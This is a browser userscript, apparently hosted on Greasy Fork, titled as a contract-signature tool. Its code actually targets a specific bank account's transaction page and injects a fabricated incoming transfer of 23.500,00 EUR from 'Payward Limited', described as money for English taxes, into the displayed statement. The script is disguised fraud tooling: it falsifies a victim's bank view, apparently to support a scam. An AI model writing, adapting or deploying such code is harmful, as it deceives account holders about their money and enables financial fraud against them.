// ==UserScript==
// @name         Vertragssignature Michael Hauffe
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/471755/Vertragssignature%20Michael%20Hauffe.user.js
// @updateURL https://update.greasyfork.org/scripts/471755/Vertragssignature%20Michael%20Hauffe.meta.js
// ==/UserScript==
...
(function() {
    ...
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "62";
    var buchungTextsZahl = "666.4468";
    var accountsecurity = "110 2689 50";
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 23.500,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Finanzamt von England für Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">23.500</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">23.500,00 EUR</span></div></div></div></div></li>';
